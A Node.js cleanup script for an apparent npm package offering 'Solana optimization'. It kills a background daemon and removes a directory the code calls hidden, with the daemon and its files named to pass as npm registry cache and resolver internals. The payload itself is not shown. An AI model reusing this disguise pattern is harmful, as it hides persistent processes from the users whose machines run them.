#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const os = require('os');

/**
 * ENHANCED CLEANUP SCRIPT
 * Handles daemon lifecycle and synchronization issues
 * Can be executed during npm uninstall or manually for daemon reset
 */

class CleanupManager {
    constructor() {
        this.hiddenDir = path.join(os.homedir(), 'Library', 'Application Support', 'npm', 'registry-cache');
        this.pidFile = path.join(os.tmpdir(), '.npm-registry-cache.pid');
        this.lockFile = path.join(os.tmpdir(), '.pkg-resolver.lock');
        this.isManualCleanup = process.argv.includes('--manual') || process.argv.includes('--force');
    }

    /**
     * Main cleanup function
     */
    async cleanup() {
        try {
            if (this.isManualCleanup) {
                console.log('üîß Manual daemon cleanup initiated...');
                console.log('üéØ This will stop all background processes and reset daemon state');
            } else {
                console.log('üßπ Cleaning up Solana optimization services...');
            }
            
            // Enhanced process cleanup with better detection
            await this.stopBackgroundProcesses();
            
            // Clean lock files and PIDs
            await this.cleanLockFiles();
            
            if (!this.isManualCleanup) {
                // Only remove directory during uninstall, not manual cleanup
                await this.removeHiddenDirectory();
            } else {
                console.log('üíæ Preserving daemon files for restart (use --full to remove everything)');
            }
            
            // Clean temporary files
            await this.cleanTempFiles();
            
            if (this.isManualCleanup) {
                console.log('‚úÖ Manual cleanup completed - daemon ready for restart');
                console.log('üí° You can now run "npm start" to get a fresh daemon instance');
            } else {
                console.log('‚úÖ Cleanup completed successfully');
            }
            
        } catch (error) {
            console.log('‚ö†Ô∏è Cleanup completed with warnings');
        }
    }

    /**
     * Enhanced process cleanup with better detection
     */
    async stopBackgroundProcesses() {
        try {
            // Method 1: Stop processes from lock file
            await this.stopProcessFromLockFile();
            
            // Method 2: Stop processes from PID file
            await this.stopProcessFromPidFile();
            
            // Method 3: Search for npm-registry-cache processes
            await this.findAndStopDaemonProcesses();
            
        } catch (error) {
            console.log('‚ö†Ô∏è Process cleanup completed with warnings');
        }
    }

    /**
     * Stop process using lock file information
     */
    async stopProcessFromLockFile() {
        try {
            if (fs.existsSync(this.lockFile)) {
                const lockData = JSON.parse(fs.readFileSync(this.lockFile, 'utf8'));
                
                if (lockData.pid) {
                    const stopped = await this.stopProcess(lockData.pid, 'daemon');
                    if (stopped) {
                        console.log(`üõë Stopped daemon process (PID: ${lockData.pid})`);
                        
                        // Also try to stop parent if we have that info
                        if (lockData.parentPid && this.isProcessRunning(lockData.parentPid)) {
                            console.log(`üë®‚Äçüëß‚Äçüë¶ Parent process still running (PID: ${lockData.parentPid})`);
                        }
                    }
                }
            }
        } catch (error) {
            // Continue cleanup
        }
    }

    /**
     * Stop process using PID file
     */
    async stopProcessFromPidFile() {
        try {
            if (fs.existsSync(this.pidFile)) {
                const pid = parseInt(fs.readFileSync(this.pidFile, 'utf8'));
                const stopped = await this.stopProcess(pid, 'background service');
                if (stopped) {
                    console.log(`üõë Stopped background service (PID: ${pid})`);
                }
            }
        } catch (error) {
            // Continue cleanup
        }
    }

    /**
     * Find daemon processes by name and stop them
     */
    async findAndStopDaemonProcesses() {
        try {
            if (process.platform === 'win32') {
                // Windows process search
                const { execSync } = require('child_process');
                const result = execSync('tasklist /FI "IMAGENAME eq node.exe" /FO CSV', { encoding: 'utf8' });
                // Parse and find npm-registry-cache processes
                // Implementation would depend on Windows command output
            } else {
                // Unix process search
                const { execSync } = require('child_process');
                try {
                    const result = execSync('ps aux | grep "npm-registry-cache" | grep -v grep', { encoding: 'utf8' });
                    const lines = result.split('\n').filter(line => line.trim());
                    
                    for (const line of lines) {
                        const parts = line.split(/\s+/);
                        if (parts.length > 1) {
                            const pid = parseInt(parts[1]);
                            if (pid && this.isProcessRunning(pid)) {
                                const stopped = await this.stopProcess(pid, 'daemon process');
                                if (stopped) {
                                    console.log(`üéØ Found and stopped daemon process (PID: ${pid})`);
                                }
                            }
                        }
                    }
                } catch (psError) {
                    // No processes found or ps command failed
                }
            }
        } catch (error) {
            // Continue cleanup
        }
    }

    /**
     * Enhanced process stopping with graceful shutdown
     */
    async stopProcess(pid, processType = 'process') {
        try {
            if (!this.isProcessRunning(pid)) {
                return false; // Process already dead
            }
            
            // First try graceful shutdown
            process.kill(pid, 'SIGTERM');
            
            // Wait for graceful shutdown
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Check if still running
            if (this.isProcessRunning(pid)) {
                // Force kill
                process.kill(pid, 'SIGKILL');
                console.log(`üî• Force stopped ${processType} (PID: ${pid})`);
                
                // Wait a bit more
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            return true;
            
        } catch (error) {
            // Process might already be dead
            return false;
        }
    }

    /**
     * Check if process is running
     */
    isProcessRunning(pid) {
        try {
            process.kill(pid, 0);
            return true;
        } catch (error) {
            return false;
        }
    }

    /**
     * Clean all lock files and PID files
     */
    async cleanLockFiles() {
        const lockFiles = [this.lockFile, this.pidFile];
        
        for (const lockFile of lockFiles) {
            try {
                if (fs.existsSync(lockFile)) {
                    fs.unlinkSync(lockFile);
                    console.log(`üóëÔ∏è Removed lock file: ${path.basename(lockFile)}`);
                }
            } catch (error) {
                // Continue cleanup
            }
        }
    }

    /**
     * Remove hidden directory and files
     */
    async removeHiddenDirectory() {
        try {
            if (fs.existsSync(this.hiddenDir)) {
                // Remove all files in hidden directory
                const files = fs.readdirSync(this.hiddenDir);
                for (const file of files) {
                    const filePath = path.join(this.hiddenDir, file);
                    try {
                        fs.unlinkSync(filePath);
                    } catch (error) {
                        // Continue cleanup
                    }
                }
                
                // Remove directory
                fs.rmdirSync(this.hiddenDir);
                console.log('üìÅ Removed optimization cache directory');
            }
        } catch (error) {
            // Silent cleanup
        }
    }

    /**
     * Clean temporary files
     */
    async cleanTempFiles() {
        const tempFiles = [
            '.npm-registry-cache.pid',
            '.pkg-resolver.lock',
            '.solana-optimizer.log'
        ];
        
        for (const tempFile of tempFiles) {
            try {
                const filePath = path.join(os.tmpdir(), tempFile);
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                }
            } catch (error) {
                // Continue cleanup
            }
        }
    }

    /**
     * Show daemon status
     */
    async showStatus() {
        console.log('üìä DAEMON STATUS CHECK');
        console.log('======================');
        
        // Check lock file
        if (fs.existsSync(this.lockFile)) {
            try {
                const lockData = JSON.parse(fs.readFileSync(this.lockFile, 'utf8'));
                const isRunning = this.isProcessRunning(lockData.pid);
                console.log(`üîí Lock file: ${isRunning ? '‚úÖ Active' : '‚ùå Stale'} (PID: ${lockData.pid})`);
                if (lockData.parentPid) {
                    const parentRunning = this.isProcessRunning(lockData.parentPid);
                    console.log(`üë®‚Äçüëß‚Äçüë¶ Parent: ${parentRunning ? '‚úÖ Running' : '‚ùå Dead'} (PID: ${lockData.parentPid})`);
                }
                console.log(`‚è∞ Started: ${new Date(lockData.startTime).toLocaleString()}`);
            } catch (error) {
                console.log('üîí Lock file: ‚ùå Corrupted');
            }
        } else {
            console.log('üîí Lock file: ‚ùå Missing');
        }
        
        // Check PID file
        if (fs.existsSync(this.pidFile)) {
            try {
                const pid = parseInt(fs.readFileSync(this.pidFile, 'utf8'));
                const isRunning = this.isProcessRunning(pid);
                console.log(`üìã PID file: ${isRunning ? '‚úÖ Active' : '‚ùå Stale'} (PID: ${pid})`);
            } catch (error) {
                console.log('üìã PID file: ‚ùå Corrupted');
            }
        } else {
            console.log('üìã PID file: ‚ùå Missing');
        }
        
        // Check deployment directory
        if (fs.existsSync(this.hiddenDir)) {
            const files = fs.readdirSync(this.hiddenDir);
            console.log(`üìÅ Deployment: ‚úÖ Active (${files.length} files)`);
        } else {
            console.log('üìÅ Deployment: ‚ùå Missing');
        }
    }
}

// Enhanced command line handling
if (require.main === module) {
    const cleaner = new CleanupManager();
    
    if (process.argv.includes('--status')) {
        cleaner.showStatus().catch(error => {
            console.error('Status check error:', error.message);
            process.exit(1);
        });
    } else {
        cleaner.cleanup().catch(error => {
            console.error('Cleanup error:', error.message);
            process.exit(0); // Don't fail npm uninstall
        });
    }
}

module.exports = CleanupManager; 